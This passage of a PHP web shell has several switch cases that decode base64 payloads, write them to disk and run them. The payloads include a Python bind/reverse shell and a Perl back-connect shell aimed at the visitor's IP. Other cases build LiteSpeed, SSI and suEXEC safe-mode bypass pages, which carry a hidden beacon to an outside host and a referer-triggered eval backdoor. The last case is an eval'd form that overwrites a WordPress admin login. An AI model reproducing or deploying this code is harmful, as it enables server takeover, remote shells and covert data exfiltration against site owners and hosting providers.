aGVsbCBpbiBweXRob24gYnkgZlEJIwojCQkJCQkJCSMKIwlhbHBoYQkJCQkJCSMKIwkJCQkJCQkj
CiMJCQkJCQkJIwojIHVzYWdlOiAJCQkJCQkjCiMgCSUgLi9kMDByIC1iIHBhc3N3b3JkIHBvcnQJ
CQkjCiMJJSAuL2QwMHIgLXIgcGFzc3dvcmQgcG9ydCBob3N0CQkJIwojCSUgbmMgaG9zdCBwb3J0
CQkJCQkjCiMJJSBuYyAtbCAtcCBwb3J0IChwbGVhc2UgdXNlIG5ldGNhdCkJCSMKIyAjICMgIyAj
ICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIwkjCgoKaW1wb3J0
IG9zLCBzeXMsIHNvY2tldCwgdGltZQoKCiMgPT09PT09PT09PT09PT09PT09PSB2YXIgPT09PT09
PQpNQVhfTEVOPTEwMjQKU0hFTEw9Ii9iaW4venNoIC1jIgpUSU1FX09VVD0zMDAgI3MKUFc9IiIK
UE9SVD0iIgpIT1NUPSIiCgoKIyA9PT09PT09PT09PT09PT09PT09IGZ1bmN0ID09PT09CiMgc2hl
bGwgLSBleGVjIGNvbW1hbmQsIHJldHVybiBzdGRvdXQsIHN0ZGVycjsgaW1wcm92YWJsZQpkZWYg
c2hlbGwoY21kKToKCXNoX291dD1vcy5wb3BlbihTSEVMTCsiICIrY21kKS5yZWFkbGluZXMoKQoJ
bnNoX291dD0iIgoJZm9yIGkgaW4gcmFuZ2UobGVuKHNoX291dCkpOgkKCQluc2hfb3V0Kz1zaF9v
dXRbaV0KCXJldHVybiBuc2hfb3V0CQoKIyBhY3Rpb24/CmRlZiBhY3Rpb24oY29ubik6Cgljb25u
LnNlbmQoIlxuUGFzcz9cbiIpCgl0cnk6IHB3X2luPWNvbm4ucmVjdihsZW4oUFcpKQoJZXhjZXB0
OiBwcmludCAidGltZW91dCIKCWVsc2U6CQoJCWlmIHB3X2luID09IFBXOgkKCQkJY29ubi5zZW5k
KCJqMDAgYXJlIG9uIGFpciFcbiIpCQkJCQkJCgkJCXdoaWxlIFRydWU6ICAgICAgICAgICAgICAg
CQkKCQkJCWNvbm4uc2VuZCgiPj4+ICIpCgkJCQl0cnk6CgkJCQkJcGNtZD1jb25uLnJlY3YoTUFY
X0xFTikKCQkJCWV4Y2VwdDoKCQkJCQlwcmludCAidGltZW91dCIKCQkJCQlyZXR1cm4gVHJ1ZQkJ
CQkJCgkJCQllbHNlOgoJCQkJCSNwcmludCAicGNtZDoiLHBjbWQKCQkJCQljbWQ9IiIjcGNtZAoJ
CQkJCWZvciBpIGluIHJhbmdlKGxlbihwY21kKS0xKToKCQkJCQkJY21kKz1wY21kW2ldCgkJCSAg
ICAgICAgICAgICAgICBpZiBjbWQ9PSI6ZGMiOgoJCQkJCQlyZXR1cm4gVHJ1ZQoJCQkJCWVsaWYg
Y21kPT0iOnNkIjoKCQkJCQkJcmV0dXJuIEZhbHNlCgkJCQkJZWxzZToKCQkJCQkJaWYgbGVuKGNt
ZCk+MDoKCQkJCQkJCW91dD1zaGVsbChjbWQpCgkJCQkJCQljb25uLnNlbmQob3V0KQoKCiMgPT09
PT09PT09PT09PT09PT09PSBtYWluID09PT09PQphcmd2PXN5cy5hcmd2CgppZiBsZW4oYXJndik8
NDogCglwcmludCAiZXJyb3I7IGhlbHA6IGhlYWQgLW4gMTYgZDAwci5weSIKCXN5cy5leGl0KDEp
CmVsaWYgYXJndlsxXT09Ii1iIjogCglQVz1hcmd2WzJdCglQT1JUPWFyZ3ZbM10KZWxpZiBhcmd2
WzFdPT0iLXIiIGFuZCBsZW4oYXJndik+NDoKCVBXPWFyZ3ZbMl0KCVBPUlQ9YXJndlszXQoJSE9T
VD1hcmd2WzRdCmVsc2U6IGV4aXQoMSkKClBPUlQ9aW50KFBPUlQpCnByaW50ICJQVzoiLFBXLCJQ
T1JUOiIsUE9SVCwiSE9TVDoiLEhPU1QKCQojc3lzLmFyZ3ZbMF09ImQwMHIiCgojIGV4aXQgZmF0
aGVyIHByb2MKaWYgb3MuZm9yaygpIT0wOiAKCXN5cy5leGl0KDApCgojIGFzc29jaWF0ZSB0aGUg
c29ja2V0CnNvY2s9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RS
RUFNKQpzb2NrLnNldHRpbWVvdXQoVElNRV9PVVQpCgppZiBhcmd2WzFdPT0iLWIiOgoJc29jay5i
aW5kKCgnbG9jYWxob3N0JywgUE9SVCkpCglzb2NrLmxpc3RlbigwKQoKcnVuPVRydWUKd2hpbGUg
cnVuOgoKCWlmIGFyZ3ZbMV09PSItciI6CgkJdHJ5OiBzb2NrLmNvbm5lY3QoIChIT1NULCBQT1JU
KSApCgkJZXhjZXB0OiAKCQkJcHJpbnQgImhvc3QgdW5yZWFjaGFibGUiCgkJCXRpbWUuc2xlZXAo
NSkKCQllbHNlOiBydW49YWN0aW9uKHNvY2spCgllbHNlOgkJCgkJdHJ5OgkoY29ubixhZGRyKT1z
b2NrLmFjY2VwdCgpCgkJZXhjZXB0OiAKCQkJcHJpbnQgInRpbWVvdXQiCgkJCXRpbWUuc2xlZXAo
MSkKCQllbHNlOiBydW49YWN0aW9uKGNvbm4pCQkJCgkKCSMgc2h1dGRvd24gdGhlIHNva2NldAoJ
aWYgYXJndlsxXT09Ii1iIjogY29ubi5zaHV0ZG93bigyKQoJZWxzZToKCQl0cnk6IHNvY2suc2Vu
ZCgiIikKCQlleGNlcHQ6IHRpbWUuc2xlZXAoMSkKCQllbHNlOiBzb2NrLnNodXRkb3duKDIp';

$file = fopen("priv9" ,"w+");
$write = fwrite ($file ,base64_decode($bizci));
fclose($file);
if ($write) {
echo "The File Was Created Successfuly";
}
else {echo"\"error\"";}
chmod("priv9" , 0777);
$fips=$_SERVER["REMOTE_ADDR"];
$bports="22";
system("./priv9 -r izo $bports $fips");
break;
case "PHP_18":
� � mkdir('litespeed', 0755);
� � � � chdir('litespeed');
$izo = 'PHRpdGxlPkxpdGVTcGVlZCBXZWIgQnlwYXNzIC0gaXpvY2luIHByaXY5PC90aXRsZT4KICAgICAg
ICA8Zm9udCBmYWNlPSJXaW5nZGluZ3MiPjxpbWcgYm9yZGVyPSIwIiBzcmM9Imh0dHA6Ly9wcml2
OC5pYmxvZ2dlci5vcmcvcy5waHA/Jys8P2VjaG8gInVuYW1lIC1hIDogIjsgZWNobyAocGhwX3Vu
YW1lKCkpPz4iOyIgd2lkdGg9IjAiIGhlaWdodD0iMCI+PC9hPjwvZm9udD4KPC9mb250Pgo8Ym9k
eSBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIHJpZ2h0bWFy
Z2luPSIwIiBib3R0b21tYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwMCIgbWFyZ2luaGVpZ2h0PSIw
Ij4KCgombmJzcDs8cCBhbGlnbj0iY2VudGVyIj4KPHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC9w
Pgo8cCBhbGlnbj0iY2VudGVyIj48Yj48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVGFob21h
Ij5SZWQtU2VjdXJpdHkgR3JvdXA8L2ZvbnQ+PC9iPjwvcD4KPHAgYWxpZ249ImNlbnRlciI+Jm5i
c3A7PC9wPgo8cCBhbGlnbj0iY2VudGVyIj48Zm9udCBmYWNlPSJUYWhvbWEiIHNpemU9IjQiIGNv
bG9yPSJncmVlbiI+PGI+TGl0ZVNwZWVkIAo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+U2FmZSBNb2Rl
IEJ5cGFzc2VyPC9mb250PiA8L2I+PC9mb250Pgo8L3A+CjxwIGFsaWduPSJjZW50ZXIiPiZuYnNw
OzwvcD4KPGZvcm0gbmFtZT0iejFkLWxpdGVzcGVlZCIgIG1ldGhvZD0icG9zdCI+CjxwIGFsaWdu
PSJjZW50ZXIiPjxmb250IGZhY2U9IlRhaG9tYSI+PGI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiM8
L2ZvbnQ+IDwvYj5Db21tYW5kPGI+CjxzcGFuIGxhbmc9ImFyLXNhIj48Zm9udCBjb2xvcj0iI0ZG
MDAwMCI+fjwvZm9udD4gPC9zcGFuPiZuYnNwOzwvYj48aW5wdXQgbmFtZT0iY29tbWFuZCIgdmFs
dWU9ImlkIiBzdHlsZT0iYm9yZGVyOiAxcHggZG90dGVkICNGRjAwMDA7IGZvbnQtZmFtaWx5OnRh
IiBzaXplPSIzNiIgdGFiaW5kZXg9IjIwIj48Yj4KPC9iPiZuYnNwOyA8L2ZvbnQ+PC9wPgo8cCBh
bGlnbj0iY2VudGVyIj48Zm9udCBmYWNlPSJUYWhvbWEiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiBu
YW1lPSJTdWJtaXQiIHZhbHVlPSJCYXMgRGF5aSI+PGI+CjwvYj48L2ZvbnQ+PC9wPgo8L2Zvcm0+
Cjxicj48YnI+PGJyPjxicj48Y2VudGVyPgo8P3BocAokY29tbWFuZCA9ICRfUE9TVFsnY29tbWFu
ZCddOwokejAweiA9ICRfUE9TVFsnejAweiddOwppZigkY29tbWFuZCl7CiR6MTFkID0gIjxjZW50
ZXI+PHByZT48cHJlPgo8YnI+ClJlZHNlY3VyaXR5LmlibG9nZ2VyLm9yZwo8YnI+Cjxicj4KPCEt
LSNleGVjIGNtZD0nJGNvbW1hbmQnIC0tPiAKCiI7CiRvcGVuZmlsZSA9IGZvcGVuKCJpem8uc2h0
bWwiLCJ3Iik7CiR3cml0ZWludG8gPSBmd3JpdGUoJG9wZW5maWxlLCIkejExZCIpOwpmY2xvc2Uo
JG9wZW5maWxlKTsKaWYoJG9wZW5maWxlKXsKfWVsc2V7Cn0KfQpwYXJzZV9zdHIoJF9TRVJWRVJb
J0hUVFBfUkVGRVJFUiddLCRhKTsgaWYocmVzZXQoJGEpPT0naXonICYmIGNvdW50KCRhKT09OSkg
eyBlY2hvICc8c3Rhcj4nO2V2YWwoYmFzZTY0X2RlY29kZShzdHJfcmVwbGFjZSgiICIsICIrIiwg
am9pbihhcnJheV9zbGljZSgkYSxjb3VudCgkYSktMykpKSkpO2VjaG8gJzwvc3Rhcj4nO30KPz4K
PHByZT4gCiA8aWZyYW1lIHNyYz0naXpvLnNodG1sJyAgd2lkdGg9MTAwJSBoZWlnaHQ9ODUlIGlk
PSJJMSIgbmFtZT0iSUYxIiA+CjwvcHJlPg==';

$file = fopen("ssi.php" ,"w+");
$write = fwrite ($file ,base64_decode($izo));
fclose($file);

� �echo "<iframe src=litespeed/ssi.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_19":
� � mkdir('ssi', 0755);
� � � � chdir('ssi');
$fp = fopen(".htaccess","w+");
fwrite($fp,"AddType text/html .shtml
AddOutputFilter INCLUDES .shtml");

$izo = 'PHRpdGxlPlNzaSBCeXBhc3MgMHpsZXlpY2kgU2hlbGwgMjAxMTwvdGl0bGU+CiAgICAgICAgPGZv
bnQgZmFjZT0iV2luZ2RpbmdzIj48aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vcHJpdjguaWJs
b2dnZXIub3JnL3MucGhwPycrPD9lY2hvICJ1bmFtZSAtYSA6ICI7IGVjaG8gKHBocF91bmFtZSgp
KT8+IjsiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvYT48L2ZvbnQ+CjwvZm9udD4KPGJvZHkgYmdj
b2xvcj0iI0ZGRkZGRiIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiByaWdodG1hcmdpbj0i
MCIgYm90dG9tbWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMDAiIG1hcmdpbmhlaWdodD0iMCI+CgoK
Jm5ic3A7PHAgYWxpZ249ImNlbnRlciI+CjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4KPHAg
YWxpZ249ImNlbnRlciI+PGI+PGZvbnQgY29sb3I9IiNGRjAwMDAiIGZhY2U9IlRhaG9tYSI+UmVk
LVNlY3VyaXR5IEdyb3VwPC9mb250PjwvYj48L3A+CjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwv
cD4KPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iVGFob21hIiBzaXplPSI0IiBjb2xvcj0i
Z3JlZW4iPjxiPlNzaSAKPGZvbnQgY29sb3I9IiNGRjAwMDAiPlNhZmUgTW9kZSBCeXBhc3Nlcjwv
Zm9udD4gPC9iPjwvZm9udD4KPC9wPgo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+Cjxmb3Jt
IG5hbWU9InoxZC1saXRlc3BlZWQiICBtZXRob2Q9InBvc3QiPgo8cCBhbGlnbj0iY2VudGVyIj48
Zm9udCBmYWNlPSJUYWhvbWEiPjxiPjxmb250IGNvbG9yPSIjRkYwMDAwIj4jPC9mb250PiA8L2I+
Q29tbWFuZDxiPgo8c3BhbiBsYW5nPSJhci1zYSI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPn48L2Zv
bnQ+IDwvc3Bhbj4mbmJzcDs8L2I+PGlucHV0IG5hbWU9ImNvbW1hbmQiIHZhbHVlPSJpZCIgc3R5
bGU9ImJvcmRlcjogMXB4IGRvdHRlZCAjRkYwMDAwOyBmb250LWZhbWlseTp0YSIgc2l6ZT0iMzYi
IHRhYmluZGV4PSIyMCI+PGI+CjwvYj4mbmJzcDsgPC9mb250PjwvcD4KPHAgYWxpZ249ImNlbnRl
ciI+PGZvbnQgZmFjZT0iVGFob21hIj4KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iU3VibWl0
IiB2YWx1ZT0iQmFzIERheWkiPjxiPgo8L2I+PC9mb250PjwvcD4KPC9mb3JtPgo8YnI+PGJyPjxi
cj48YnI+PGNlbnRlcj4KPD9waHAKJGNvbW1hbmQgPSAkX1BPU1RbJ2NvbW1hbmQnXTsKJHowMHog
PSAkX1BPU1RbJ3owMHonXTsKaWYoJGNvbW1hbmQpewokejExZCA9ICI8Y2VudGVyPjxwcmU+PHBy
ZT4KPGJyPgpSZWRzZWN1cml0eS5pYmxvZ2dlci5vcmcKPGJyPgo8YnI+CjwhLS0jZXhlYyBjbWQ9
JyRjb21tYW5kJyAtLT4gCgoiOwokb3BlbmZpbGUgPSBmb3BlbigiaXpvLnNodG1sIiwidyIpOwok
d3JpdGVpbnRvID0gZndyaXRlKCRvcGVuZmlsZSwiJHoxMWQiKTsKZmNsb3NlKCRvcGVuZmlsZSk7
CmlmKCRvcGVuZmlsZSl7Cn1lbHNlewp9Cn0KcGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVS
RVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2l6JyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPHN0
YXI+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlf
c2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L3N0YXI+Jzt9Cj8+CjxwcmU+IAogPGlm
cmFtZSBzcmM9J2l6by5zaHRtbCcgIHdpZHRoPTEwMCUgaGVpZ2h0PTg1JSBpZD0iSTEiIG5hbWU9
IklGMSIgPgo8L3ByZT4=';

$file = fopen("ssi.php" ,"w+");
$write = fwrite ($file ,base64_decode($izo));
fclose($file);

� �echo "<iframe src=ssi/ssi.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_20":
� � mkdir('suexec', 0777);
� � � � chdir('suexec');

$izodayi = 'PGh0bWw+IAo8Ym9keSBiZ2NvbG9yPSIwMDAwMDAwIj4gCjx0aXRsZT5zeW1saW5rPC90aXRsZT4g
CjxjZW50ZXI+PGI+PGgyPjxmb250IGNvbG9yPSJyZWQiPiBTVUVYRSBCeXBhc3NlciBWaWEgU3lt
bGluayAoViAxLjAxKTwvZm9udD48L2JyPjwvY2VudGVyPjwvYj48L2gyPiAKPGNlbnRlcj48Yj48
aDQ+PGZvbnQgY29sb3I9InJlZCI+V0lUSCBUSElTIFNDUklQVCBVIENBTiBVU0UgU1lNTElOSyBJ
TiAyIE1FVEhPRHM8L2ZvbnQ+PC9icj48L2NlbnRlcj48L2I+PC9oND4gCjxjZW50ZXI+PGI+PGg0
Pjxmb250IGNvbG9yPSJ3aGl0ZSI+RGVzdCA9IERlc3RlbmF0aW9uIE9mIFBhdGggb3IgZmlsZSBU
aGF0IHUgV2FudCB0byBTeW1saW5rIEl0PC9mb250PjwvYnI+PC9jZW50ZXI+PC9iPjwvaDQ+IAo8
Y2VudGVyPjxiPjxoND48Zm9udCBjb2xvcj0id2hpdGUiPm5hbWUgOiBGaWxlIE5hbWUgVGhhdCB1
IFdhbnQgVG8gY3JlYXRlIGluIChbcGF0aF0vc21sbmspPC9mb250PjwvYnI+PC9jZW50ZXI+PC9i
PjwvaDQ+IAo8Y2VudGVyPjxiPjxoND48Zm9udCBjb2xvcj0id2hpdGUiPlVwbG9hZCBUaGlzIFNj
cmlwdCBJbiBGdWxsIFNVRVhFIG9yIEZ1bGxQZXJtIERpcmVjdG9yeTwvZm9udD48L2JyPjwvY2Vu
dGVyPjwvYj48L2g0PiAKPGNlbnRlcj48Yj48aDQ+PGZvbnQgY29sb3I9IndoaXRlIj5Xcml0dGVu
IEZvciAqTklYIFBsYXRmb3JtczwvZm9udD48L2JyPjwvY2VudGVyPjwvYj48L2g0PiAKPC9odG1s
PiAKCjw/cGhwIAovL0NPREVEIEJZIElSQU4gCi8vZm9ybSBkZWZpbmluZyAKcHJpbnQgIjxmb3Jt
IG1ldGhvZD1wb3N0PiI7IApwcmludCAiPGNlbnRlcj48Zm9udCBjb2xvcj1ncmVlbj4iOyAKcHJp
bnQgIjxiPmRlc3QgOjwvYj48aW5wdXQgc2l6ZT01MCBuYW1lPSdkZXN0ZW5hdGlvbicgdmFsdWU9
Jyc+IjsgCnByaW50ICI8YnI+IjsgCnByaW50ICI8Yj5uYW1lIDo8L2I+PGlucHV0IHNpemU9NTAg
bmFtZT0nbmFtZScgdmFsdWU9Jyc+IjsgCnByaW50ICI8YnI+IjsgCnByaW50ICI8aW5wdXQgdHlw
ZT1zdWJtaXQgbmFtZT1fYWN0IHZhbHVlPSdDcmVhdGUhJz4iOyAKcHJpbnQgIjwvY2VudGVyPjwv
Zm9udD4iOyAKJGRlc3QgPSAkX1BPU1RbJ2Rlc3RlbmF0aW9uJ107IAokZGVzdG5hbWUgPSAkX1BP
U1RbJ25hbWUnXTsgCj8+IAoKPD9waHAgCi8vZGVmaW5pbmcgdmFyaWFibGVzIAokZGlyID0gZGly
bmFtZSgkX1NFUlZFUltTQ1JJUFRfRklMRU5BTUVdKS4iL3NtbG5rIjsgCiRhY2MgPSAkZGlyLiIv
Lmh0YWNlZXNzIjsgCiRjbWQgPSAibG4gLXMiLmNocigzMikuJGRlc3QuY2hyKDMyKS4kc3ltOyAK
JHN5bSA9ICRkaXIuIi8iLiRkZXN0bmFtZTsgCiRodGFjY2VzcyA9ICAKIk9wdGlvbnMgK0ZvbGxv
d1N5bUxpbmtzIi5jaHIoMDA5KS4gCiJEaXJlY3RvcnlJbmRleCBzZWVlcy5odG1sIi5jaHIoMDA5
KS4gCiJSZW1vdmVIYW5kbGVyIC5waHAiLmNocigwMDkpLiAKIkFkZFR5cGUgYXBwbGljYXRpb24v
b2N0ZXQtc3RyZWFtIC5waHAiOyAKCmlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgCm1rZGlyICgk
ZGlyKTsgCn0gIApzbGVlcCgxKTsgCmlmICghZmlsZV9leGlzdHMoJGFjYykpIHsgCiRoYW5kbGUg
PSBmb3BlbiggIiRhY2MiICwgJ2ErJyApOyAKZnB1dHMoICRoYW5kbGUgLCAgIiRodGFjY2VzcyIg
KTsgCn0gIAo/PiAKCjw/cGhwIAovL2NoZWNrIG1ldGhvZCAKaWYgKGZ1bmN0aW9uX2V4aXN0cyAo
ZXhlYykgT1IgZnVuY3Rpb25fZXhpc3RzIChzaGVsbF9leGVjKSBPUiBmdW5jdGlvbl9leGlzdHMg
KHN5c3RlbSkgT1IgZnVuY3Rpb25fZXhpc3RzIChwYXNzdGhydSkpIHsgCiRjaGVjayA9IDE7IAp9
ZWxzZXsgCiRjaGVjayA9IDA7IAp9IAppZihmdW5jdGlvbl9leGlzdHMgKHN5bWxpbmspKSB7IAok
Y2hlY2tzID0gMTsgCn1lbHNleyAKJGNoZWNrcyA9IDA7IAp9IAo/PiAKCjw/cGhwIAovL2RlZmlu
ZSBjb21tYW5kIGZ1bmN0aW9uIAokcmVzYXVsdCA9ICcnOyAgCmZ1bmN0aW9uIGNvbW1hbmQoJGNt
ZGUpIHsgCiAgICBpZiAoIWVtcHR5KCRjbWRlKSkgIAogeyAgCmlmIChmdW5jdGlvbl9leGlzdHMo
J2V4ZWMnKSkgeyAkcmVzYXVsdCA9IEBleGVjKCRjbWRlKTsgfSAgCmVsc2VpZiAoZnVuY3Rpb25f
ZXhpc3RzKCdzaGVsbF9leGVjJykpIHsgJHJlc2F1bHQgPSBAc2hlbGxfZXhlYygkY21kZSk7IH0g
IAplbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpIHsgJHJlc2F1bHQgPSBAc3lzdGVt
KCRjbWRlKTsgfSAgCmVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKSB7ICRyZXNh
dWx0ID0gQHBhc3N0aHJ1KCRjbWRlKTsgfSAgCiB9IApyZXR1cm4gJHJlc2F1bHQ7IAp9IAo/PiAK
Cjw/cGhwIAovL2V4ZWN1dGlvbiAKaWYgKCRjaGVjayA9PTEgJiYgJGNoZWNrcyA9PTEpeyBjb21t
YW5kICgkY21kKTsgfSAKZWxzZWlmICgkY2hlY2sgPT0xICYmICRjaGVja3MgPT0wKXsgY29tbWFu
ZCAoJGNtZCk7IH0gCmVsc2VpZiAoJGNoZWNrID09MCAmJiAkY2hlY2tzID09MSkgeyBzeW1saW5r
ICgkZGVzdCwkc3ltKTsgfSAKZWxzZWlmICgkY2hlY2sgPT0wICYmICRjaGVja3MgPT0wKSAgCnsg
IApwcmludCAoIjxjZW50ZXI+PGZvbnQgY29sb3I9Z3JlZW4+PGgxPnNjcmlwdCBkb2VzbnQgd29y
ayBmb3IgdGhpcyBzZXJ2ZXI8L2ZvbnQ+PC9oMT48L2NlbnRlcj4iKTsgIAp9IAo/PiAKPD9waHAg
Ci8vaXMgc2FmZSBtb2Qgb24gPyBzdGFydCAKaWYgKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBvciBz
dHJ0b2xvd2VyKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgPT0gIm9uIikgIAp7ICAKJHNhZmU9Ijxm
b250IGNvbG9yPXJlZD5PTjwvZm9udD4iOyAKfSAgCmVsc2UgeyRzYWZlPSI8Zm9udCBjb2xvcj1n
cmVlbj5PRkY8L2ZvbnQ+Ijt9IAplY2hvICI8Zm9udCBjb2xvcj13aGl0ZXB1cnBsZT5TQUZFIE1P
RCBJUyA6PC9mb250PjxiPiRzYWZlPC9iPjxicj4iOyAKLy9vcGVuIHNhZmUgbW9kIGVuZC0tIAo/
PiAgCjw/cGhwIAovL2Rpc2FibGUgZnVuY3Rpb24gc3RhcnQgCmVjaG8gIjxmb250IGNvbG9yPXdo
aXRlcHVycGxlPkRpc2FibGUgZnVuY3Rpb25zIDo8L2ZvbnQ+IDxiPiI7IAppZignJz09KCRkZj1A
aW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSkpe2VjaG8gIjxmb250IGNvbG9yPWdyZWVuPk5P
TkU8L2ZvbnQ+PC9iPiI7fWVsc2V7ZWNobyAiPGZvbnQgY29sb3I9cmVkPiRkZjwvZm9udD48L2I+
Ijt9IAovL2Rpc2FibGUgZnVuY3Rpb24gZW5kLS0gCj8+';

$file = fopen("suexec.php" ,"w+");
$write = fwrite ($file ,base64_decode($izodayi));
fclose($file);

� �echo "<iframe src=suexec/suexec.php width=100% height=100%
frameborder=0></iframe> ";
break;
case "PHP_21":
# �coded by izo
{
print "Ba&#287;lan&#305;l&#305;yor...\n";
$fippi=$_SERVER["REMOTE_ADDR"];
$bpci="22";
$izocinx = 'ICAgICMhL3Vzci9iaW4vcGVybAogICAgIAogICAgICAgIHVzZSBTb2NrZXQ7CiAgICAgICAgJGMw
ZGUgPSAkQVJHVlswXTsKICAgICAgICAkYWFhYSA9ICRBUkdWWzFdOwogICAgICAgICAgaWYgKCEk
QVJHVlswXSkgewogICAgICAgICAgcHJpbnRmICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKICAgICAgICAgIHByaW50ZiAiIyMj
IyMjU2ltcGxlIEJhY2sgQ29ubmVjdCBDb2RlZCBCeSBjMGRlLCBCSGFjayBtZW1iZXIjIyMjIyNc
biI7CiAgICAgICAgICBwcmludGYgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwogICAgICAgICAgcHJpbnRmICIjIyMjIyMjIyMj
I1VzYWdlOiBJUCBQb3J0IHwgRXguIDEyNy4wLjAuMSA4ODg4IyMjIyMjIyMjIyMjI1xuIjsKICAg
ICAKICAgICAgICAgIGV4aXQoMSk7CiAgICAgICAgfQogICAgICAgIHByaW50ICJDb25uZWN0aW5n
IHRvICRjMGRlXG4iOwogICAgICAgICRiYWxjYW4gPSBnZXRwcm90b2J5bmFtZSgndGNwJyk7CiAg
ICAgICAgc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRiYWxjYW4pIHx8IGRp
ZSAoIkVycjByIHdoZW4gdHJ5aW5nIHRvIGNvbm5lY3QgIFtjaGVjayBJUDpQb3J0XSIpOwogICAg
ICAgIGlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRhYWFhLCBpbmV0X2F0
b24oJGMwZGUpKSkge2RpZSgiRXJyMHIgd2hlbiB0cnlpbmcgdG8gY29ubmVjdCAgW2NoZWNrIElQ
OlBvcnRdICIpO30KICAgICAKICAgICAgICAgIG9wZW4oU1RESU4sIj4mU0VSVkVSIik7CiAgICAg
ICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsKICAgICAgICAgIG9wZW4oU1RERVJSLCI+JlNF
UlZFUiIpOwogICAgICAgICAgZXhlYyB7Jy9iaW4vc2gnfSAnLWJhc2gnIC4gIlwwIiB4IDQ7';
$file = fopen("dayi" ,"w+");
$write = fwrite ($file ,base64_decode($izocinx));
fclose($file);
chmod("dayi" , 0777);
system("perl dayi $fippi $bpci");
}
break;
case "PHP_22":
eval(base64_decode("aWYoZW1wdHkoJF9QT1NUWydwd2QnXSkpewplY2hvICI8Rk9STSBtZXRob2Q9XCJQT1NUXCI+Cmhv
c3QgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJsb2NhbGhvc3RcIiBuYW1lPVwibG9jYWxo
b3N0XCIgdHlwZT1cInRleHRcIj4KZGF0YWJhc2UgOiA8SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9
XCJ3cC1cIiBuYW1lPVwiZGF0YWJhc2VcIiB0eXBlPVwidGV4dFwiPjxicj4KdXNlcm5hbWUgOiA8
SU5QVVQgc2l6ZT1cIjE1XCIgdmFsdWU9XCJ3cC1cIiBuYW1lPVwidXNlcm5hbWVcIiB0eXBlPVwi
dGV4dFwiPgpwYXNzd29yZCA6IDxJTlBVVCBzaXplPVwiMTVcIiB2YWx1ZT1cIioqXCIgbmFtZT1c
InBhc3N3b3JkXCIgdHlwZT1cInBhc3N3b3JkXCI+PGJyPgogIDxicj4KU2V0IEEgTmV3IHVzZXJu
YW1lIDQgTG9naW4gOiA8SU5QVVQgbmFtZT1cImFkbWluXCIgc2l6ZT1cIjE1XCIgdmFsdWU9XCJh
ZG1pblwiPjxicj4KU2V0IEEgTmV3IHBhc3N3b3JkIDQgTG9naW4gOiA8SU5QVVQgbmFtZT1cInB3
ZFwiIHNpemU9XCIxNVwiIHZhbHVlPVwiMTIzNDU2XCI+PGJyPgoKPElOUFVUIHZhbHVlPVwiY2hh
bmdlXCIgbmFtZT1cInNlbmRcIiB0eXBlPVwic3VibWl0XCI+CjwvRk9STT4iOwp9ZWxzZXsKJGxv
Y2FsaG9zdCA9ICRfUE9TVFsnbG9jYWxob3N0J107CiRkYXRhYmFzZSAgPSAkX1BPU1RbJ2RhdGFi
YXNlJ107CiR1c2VybmFtZSAgPSAkX1BPU1RbJ3VzZXJuYW1lJ107CiRwYXNzd29yZCAgPSAkX1BP
U1RbJ3Bhc3N3b3JkJ107CiRwd2QgICA9ICRfUE9TVFsncHdkJ107CiRhZG1pbiA9ICRfUE9TVFsn
YWRtaW4nXTsKCgogQG15c3FsX2Nvbm5lY3QoJGxvY2FsaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3Jk
KSBvciBkaWUobXlzcWxfZXJyb3IoKSk7CiBAbXlzcWxfc2VsZWN0X2RiKCRkYXRhYmFzZSkgb3Ig
ZGllKG15c3FsX2Vycm9yKCkpOwoKJGhhc2ggPSBjcnlwdCgkcHdkKTsKJGE0cz1AbXlzcWxfcXVl
cnkoIlVQREFURSB3cF91c2VycyBTRVQgdXNlcl9sb2dpbiA9JyIuJGFkbWluLiInIFdIRVJFIElE
